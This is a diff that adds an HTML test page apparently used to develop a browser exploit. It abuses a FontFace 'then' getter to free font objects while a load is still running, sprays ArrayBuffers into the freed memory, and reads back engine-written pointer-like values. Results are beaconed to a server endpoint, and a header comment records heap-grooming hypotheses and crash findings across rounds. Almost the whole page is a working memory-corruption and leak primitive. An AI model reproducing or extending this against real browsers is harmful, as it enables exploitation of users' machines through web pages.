@@ -1,0 +1,205 @@
+<!--
+  p667: keep-spray-alive — p666-exact machinery with ONE delta: the getter
+  NEVER drops previous rounds' lanes. Every round allocates a FRESH 24-lane
+  spray into window.__sprayAlive[round] (same law as __facesAlive); the
+  per-round `spray` reference still points at only the current round's lanes
+  so scanHit/dumps stay per-round.
+
+  Why (p666 findings, logs beacons_d8faf68b / beacons_ec2486dc, 2026-11-11):
+    - #sp24: 9/9 loads died inside the R1 window (only R0+R0LATE ever
+      beaconed; R1 analysis beacon never once escaped).
+    - #nosp (free, NO spray): 8/8 beaconed runs survived R0 AND R1 complete
+      (gf=0 then gf=1, both LATE passes alive), then died entering R2.
+    => stale engine writes into freed-but-unreused chunks are benign (bmalloc
+       keeps small freelist metadata out-of-line, so a write into a freed
+       192B chunk poisons nothing by itself);
+    => the spray accelerates death by exactly one round. Prime suspect: each
+       round's getter did `spray = []`, dropping the PREVIOUS round's lanes —
+       the engine still holds a ref into (old) lane 2's backing store (rc=101
+       observed every round), so at the next round's engine write the ref
+       points into FREED backing store that R1's own allocations immediately
+       reuse -> lethal corruption of a live object. Faces are kept alive via
+       __facesAlive; buffers were NOT. p667 fixes exactly that.
+
+  Hypothesis: if keep-alive of every lane removes the freed-backing-store
+  condition, the page survives all ROUNDS=8 (multi-round leak unlocked:
+  same-WebProcess T/lane drift across 8 rounds = the groom-distance dataset
+  p663 wanted). If it still dies at R2, the freed-buffer hypothesis is refuted
+  and the killer is engine-side accumulation (stale refs count grows per
+  round regardless of our buffers).
+
+  Per round r (t0 = fonts.load trigger):
+    t0        getter: sty.remove + fonts.delete + offsetHeight + fresh spray
+              into __sprayAlive[round] (NO emit; nothing freed)
+    t0+150ms  analyze: R-r line (hit|miss, T, W, rc, opc, st82, gf, dirtyNear)
+              + DUMP1 -> flush
+    t0+3500ms LATE: DUMP2 + diff -> flush
+    t0+3750ms next round
+  Variants (location.hash): #sp12 / #sp24 (default). #nosp kept for symmetry
+  (8-round nosp replica). ROUNDS = 8. Faces kept alive (p656b law).
+  Beacon: P667-.  CRASH_CLASS: MEDIUM (survival expected — death at R2 would
+  itself be the decisive datum).
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p667</title></head>
+<body>p667: keep-spray-alive (auto, r8, lanes never dropped)
+<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
+<script>
+(function() {
+'use strict';
+var L = document.getElementById('log');
+var bQ = [];
+function emit(tag, msg) {            /* batch-only: never auto-flush */
+  var s = tag + (msg ? ' ' + msg : '');
+  L.textContent += s + '\n';
+  bQ.push(s);
+}
+function flush() {                    /* only called at safe points */
+  while (bQ.length) {
+    var b = bQ.splice(0, 2).join('|');
+    try { var x = new XMLHttpRequest(); x.open('GET', '/beacon/P667-' + encodeURIComponent(b), false); x.send(); } catch(e) {}
+  }
+}
+window.onerror = function(m) { emit('ERR', String(m).slice(0,120)); flush(); };
+function hex32(v) { return ('00000000' + (v >>> 0).toString(16)).slice(-8); }
+
+var h = (location.hash || '').toLowerCase();
+var VARIANT = h.indexOf('nosp') >= 0 ? 'nosp' : (h.indexOf('sp12') >= 0 ? 'sp12' : 'sp24');
+var LANES   = VARIANT === 'nosp' ? 0 : (VARIANT === 'sp12' ? 12 : 24);
+
+emit('START', 'keepspray r8 ' + VARIANT + ' lanes=' + LANES);
+flush();
+
+var ROUNDS = 8;
+var round = 0;
+var results = [];
+var gfired = -1;                      /* getter fired for this round (memory only) */
+
+var sty = null, ff = null;
+var armed = false;
+var spray = [];
+window.__sprayAlive = [];             /* p667 delta: every round's lanes stay rooted */
+var snap1 = null;
+
+Object.defineProperty(FontFace.prototype, 'then', {
+  configurable: true,
+  get: function() {
+    if (!armed) return undefined;
+    armed = false;
+    gfired = round;                   /* in-window: memory only, NO emit */
+    try { sty.remove(); } catch(e) {}
+    try { document.fonts.delete(this); } catch(e) {}
+    document.body.offsetHeight;
+    /* p667 delta: NO spray = [] — accumulate; nothing is ever freed */
+    spray = window.__sprayAlive[round] = [];
+    for (var i = 0; i < LANES; i++) {
+      var ab = new ArrayBuffer(192);
+      var dv = new DataView(ab);
+      dv.setUint32(0x00, 100 + round, true);
+      dv.setUint32(0x04, 0x5A5A0000 | round, true);
+      dv.setUint32(0x08, i, true);
+      spray.push(dv);
+    }
+    return undefined;
+  },
+  set: function() {}
+});
+
+function dumpLane(dv) {
+  var out = [];
+  for (var off = 0; off <= 0xB8; off += 8) {
+    var lo = dv.getUint32(off, true), hi = dv.getUint32(off + 4, true);
+    if (lo !== 0 || hi !== 0) out.push(off.toString(16) + ':' + hex32(hi) + hex32(lo));
+  }
+  return out.join(',');
+}
+
+function scanHit() {
+  for (var i = 0; i < spray.length; i++) {
+    if (spray[i].getUint32(0x58, true) !== 0 || spray[i].getUint32(0x5C, true) !== 0) return i;
+  }
+  return -1;
+}
+
+function beginRound() {
+  sty = document.createElement('style');
+  sty.textContent = "@font-face { font-family: s" + round + "; src: local(Arial); unicode-range: U+0042; }";
+  document.head.appendChild(sty);
+  ff = new FontFace('f' + round, 'local(Helvetica)', { unicodeRange: 'U+0041' });
+  document.fonts.add(ff);
+  void ff.loaded;
+  window.__facesAlive = window.__facesAlive || [];
+  window.__facesAlive.push(ff);
+  armed = true;
+  document.fonts.load('1em f' + round + ', s' + round, 'AB');
+  setTimeout(analyzeEarly, 150);
+  setTimeout(analyzeLate, 3500);
+}
+
+function analyzeEarly() {
+  try {
+    var hit = scanHit();
+    if (VARIANT === 'nosp') {
+      emit('R' + round, 'nosp gf=' + gfired + ' alive');
+      results.push({ r: round, lane: -1, t: '-', w: '-' });
+    } else if (hit < 0) {
+      emit('R' + round, 'MISS gf=' + gfired);
+      results.push({ r: round, lane: -1, t: '-', w: '-' });
+    } else {
+      var dv = spray[hit];
+      snap1 = dumpLane(dv);
+      var tLo = dv.getUint32(0x58, true), tHi = dv.getUint32(0x5C, true);
+      var wLo = dv.getUint32(0x68, true), wHi = dv.getUint32(0x6C, true);
+      var dirtyNear = 0;
+      for (var j = Math.max(0, hit - 3); j <= Math.min(spray.length - 1, hit + 3); j++) {
+        if (spray[j].getUint32(0x58, true) !== 0 || spray[j].getUint32(0x5C, true) !== 0) dirtyNear++;
+      }
+      results.push({ r: round, lane: hit, t: hex32(tHi) + hex32(tLo), w: hex32(wHi) + hex32(wLo) });
+      emit('R' + round, 'hit=' + hit + ' T=' + hex32(tHi) + hex32(tLo) +
+           ' W=' + hex32(wHi) + hex32(wLo) + ' rc=' + dv.getUint32(0x00, true) +
+           ' opc=' + dv.getUint32(0x60, true) + ' st82=' + dv.getUint8(0x82) +
+           ' gf=' + gfired + ' dirtyNear=' + dirtyNear);
+      emit('R' + round + 'DUMP1', snap1.slice(0, 700));
+    }
+    flush();                          /* post-analysis only: data escapes here */
+  } catch(e) { emit('R' + round + '-FATAL', String(e).slice(0,150)); flush(); }
+}
+
+function analyzeLate() {
+  try {
+    var hit = scanHit();
+    if (VARIANT !== 'nosp' && hit >= 0 && spray.length) {
+      var dv = spray[hit];
+      var snap2s = dumpLane(dv);
+      emit('R' + round + 'LATE', 'alive st82=' + dv.getUint8(0x82) +
+           ' rc=' + dv.getUint32(0x00, true) +
+           ' changed=' + (snap1 !== snap2s ? 'YES' : 'no'));
+      if (snap1 !== snap2s) emit('R' + round + 'DUMP2', snap2s.slice(0, 700));
+    } else {
+      emit('R' + round + 'LATE', 'alive (' + (VARIANT === 'nosp' ? 'nosp' : 'miss-round') + ')');
+    }
+    flush();
+    round++;
+    if (round < ROUNDS) {
+      gfired = -1;
+      setTimeout(beginRound, 250);
+    } else {
+      var ts = {}, lanes = [];
+      for (var k = 0; k < results.length; k++) {
+        ts[results[k].t] = (ts[results[k].t] || 0) + 1;
+        lanes.push(results[k].lane);
+      }
+      var keys = Object.keys(ts);
+      emit('SUMMARY', VARIANT + ' rounds=' + results.length + ' kept=' + window.__sprayAlive.length +
+           ' distinctT=' + keys.length + ' lanes=[' + lanes.join(',') + ']');
+      for (var q = 0; q < keys.length; q++) emit('TVAL', keys[q] + ' x' + ts[keys[q]]);
+      emit('ALIVE', 'end-r8-' + VARIANT);
+      flush();
+    }
+  } catch(e) { emit('R' + round + 'LATE-FATAL', String(e).slice(0,150)); flush(); }
+}
+
+setTimeout(beginRound, 50);
+
+})();
+</script>
+</body></html>
